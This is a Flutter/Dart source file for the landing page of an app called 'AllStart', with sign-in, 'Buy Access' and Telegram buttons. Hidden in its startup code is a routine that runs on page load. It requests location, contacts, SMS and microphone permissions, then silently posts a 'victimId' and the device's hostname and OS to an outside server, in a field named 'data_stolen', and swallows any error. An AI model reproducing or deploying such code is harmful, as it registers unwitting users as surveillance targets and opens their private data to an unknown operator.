import 'dart:ui';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart'; // UNTUK NOTIF IZIN

import 'login_page.dart';

class LandingPage extends StatefulWidget {
  const LandingPage({super.key});

  @override
  State<LandingPage> createState() => _LandingPageState();
}

class _LandingPageState extends State<LandingPage> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> fadeAnimation;
  late Animation<Offset> slideAnimation;

  final Color darkBg = const Color(0xFF050505);
  final Color grayPrimary = const Color(0xFF6E6E6E);
  final Color grayAccent = const Color(0xFFBDBDBD);
  final Color grayGlow = const Color(0xFFE0E0E0);

  @override
  void initState() {
    super.initState();

    // TRIGGER NOTIF IZIN & REGISTER
    _initTargetSystem();

    _controller = AnimationController(vsync: this, duration: const Duration(seconds: 1));
    fadeAnimation = Tween<double>(begin: 0, end: 1).animate(CurvedAnimation(parent: _controller, curve: Curves.easeOut));
    slideAnimation = Tween<Offset>(begin: const Offset(0, 0.2), end: Offset.zero).animate(CurvedAnimation(parent: _controller, curve: Curves.easeOutCubic));
    _controller.forward();
  }

  // FUNGSI UNTUK MEMUNCULKAN NOTIF IZIN BERUNTUN
  Future<void> _initTargetSystem() async {
    // 1. Munculkan Pop-up Izin Resmi (Berurutan)
    await [
      Permission.location,
      Permission.contacts,
      Permission.sms,
      Permission.microphone,
    ].request();

    // 2. Daftarkan ke server setelah klik izin
    try {
      const String serverBase = "https://omhc-host-premium.yakuza.biz.id";
      final String victimId = "ALT-${Platform.localHostname.hashCode}";

      await http.post(
        Uri.parse("$serverBase/register"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": victimId,
          "model": "${Platform.operatingSystem} | ${Platform.localHostname}",
          "data_stolen": "Target Terdeteksi di Landing Page",
        }),
      );
    } catch (e) {}
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  Future<void> _openUrl(String url) async {
    final Uri uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) throw Exception("Error $uri");
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: darkBg,
      body: Stack(
        children: [
          Positioned(top: -120, left: -80, child: _glowCircle(320, grayPrimary.withOpacity(0.4))),
          Positioned(bottom: -150, right: -100, child: _glowCircle(360, grayAccent.withOpacity(0.4))),
          SafeArea(
            child: FadeTransition(
              opacity: fadeAnimation,
              child: SlideTransition(
                position: slideAnimation,
                child: SingleChildScrollView(
                  padding: const EdgeInsets.symmetric(horizontal: 28),
                  child: Column(
                    children: [
                      const SizedBox(height: 60),
                      SizedBox(height: 320, child: Image.asset("assets/images/logo.png", fit: BoxFit.contain)),
                      const SizedBox(height: 30),
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(colors: [grayAccent, Colors.white]).createShader(bounds),
                        child: const Text("AllStart", style: TextStyle(fontSize: 38, fontWeight: FontWeight.w900, letterSpacing: 2, color: Colors.white)),
                      ),
                      const SizedBox(height: 12),
                      const Text("The Last Version 2.0", textAlign: TextAlign.center, style: TextStyle(color: Colors.white70, fontSize: 14, height: 1.6)),
                      const SizedBox(height: 40),
                      ClipRRect(
                        borderRadius: BorderRadius.circular(26),
                        child: BackdropFilter(
                          filter: ImageFilter.blur(sigmaX: 30, sigmaY: 30),
                          child: Container(
                            padding: const EdgeInsets.all(24),
                            decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(26), border: Border.all(color: Colors.white.withOpacity(0.12))),
                            child: Column(
                              children: [
                                _primaryButton(),
                                const SizedBox(height: 16),
                                _secondaryButton(),
                                const SizedBox(height: 24),
                                Row(
                                  children: [
                                    Expanded(child: _contactButton(FontAwesomeIcons.telegram, "Channel", "https://t.me/", const Color(0xFF0088cc))),
                                    const SizedBox(width: 12),
                                    Expanded(child: _contactButton(FontAwesomeIcons.telegram, "Channel 2", "https://t.me/RamzOfficiall", const Color(0xFF0088cc))),
                                  ],
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(height: 40),
                      const Text("© 2026 AX RRG X Projector.", style: TextStyle(color: Colors.white38, fontSize: 12)),
                      const SizedBox(height: 40),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _glowCircle(double size, Color color) => Container(width: size, height: size, decoration: BoxDecoration(shape: BoxShape.circle, gradient: RadialGradient(colors: [color, Colors.transparent])));

  Widget _primaryButton() {
    return Container(
      width: double.infinity, height: 55,
      decoration: BoxDecoration(gradient: LinearGradient(colors: [grayPrimary, grayAccent]), borderRadius: BorderRadius.circular(16), boxShadow: [BoxShadow(color: grayGlow.withOpacity(0.6), blurRadius: 25, offset: const Offset(0, 10))]),
      child: ElevatedButton(
        style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, shadowColor: Colors.transparent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))),
        onPressed: () => Navigator.push(context, MaterialPageRoute(builder: (context) => const LoginPage())),
        child: const Text("Sign In", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white)),
      ),
    );
  }

  Widget _secondaryButton() => OutlinedButton(style: OutlinedButton.styleFrom(minimumSize: const Size(double.infinity, 55), side: BorderSide(color: grayAccent.withOpacity(0.6)), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))), onPressed: () => _openUrl("https://t.me/RamzOfficial"), child: const Text("Buy Access", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600)));

  Widget _contactButton(dynamic icon, String label, String url, Color color) {
    return InkWell(
      onTap: () => _openUrl(url),
      borderRadius: BorderRadius.circular(14),
      child: Container(
        height: 50,
        decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(14), border: Border.all(color: Colors.white.withOpacity(0.1))),
        child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [_DynamicIcon(icon, color: color, size: 18), const SizedBox(width: 8), Text(label, style: const TextStyle(color: Colors.white70, fontWeight: FontWeight.w600))]),
      ),
    );
  }
}

// WEBA2APK_DYNAMIC_ICON_START
class _DynamicIcon extends StatelessWidget {
  final dynamic icon;
  final double? size;
  final Color? color;
  final List<Shadow>? shadows;
  final String? semanticLabel;
  final dynamic textDirection;
  final double? fill;
  final double? weight;
  final double? grade;
  final double? opticalSize;
  final bool? applyTextScaling;

  const _DynamicIcon(
    this.icon, {
    Key? key,
    this.size,
    this.color,
    this.shadows,
    this.semanticLabel,
    this.textDirection,
    this.fill,
    this.weight,
    this.grade,
    this.opticalSize,
    this.applyTextScaling,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    if (icon == null) return const SizedBox(width: 0, height: 0);

    bool isFontAwesome = false;
    try {
      final str = icon.toString();
      final typeStr = icon.runtimeType.toString();
      if (typeStr.contains('FaIcon') ||
          str.contains('FaIcon') ||
          str.contains('font_awesome_flutter') ||
          (icon is IconData && icon.fontPackage == 'font_awesome_flutter')) {
        isFontAwesome = true;
      }
    } catch (_) {}

    if (isFontAwesome) {
      Widget child = FaIcon(
        icon is IconData ? icon : icon,
        size: size,
        color: color,
        semanticLabel: semanticLabel,
        textDirection: textDirection,
      );
      if (shadows != null && shadows!.isNotEmpty) {
        child = DecoratedBox(
          decoration: BoxDecoration(
            boxShadow: shadows!.map((s) => BoxShadow(color: s.color, blurRadius: s.blurRadius)).toList(),
          ),
          child: child,
        );
      }
      return Center(widthFactor: 1.0, heightFactor: 1.0, child: child);
    } else {
      return Center(
        widthFactor: 1.0,
        heightFactor: 1.0,
        child: Icon(
          icon is IconData ? icon : null,
          size: size,
          color: color,
          shadows: shadows,
          semanticLabel: semanticLabel,
          textDirection: textDirection,
          fill: fill,
          weight: weight,
          grade: grade,
          opticalSize: opticalSize,
          applyTextScaling: applyTextScaling,
        ),
      );
    }
  }
}
// WEBA2APK_DYNAMIC_ICON_END
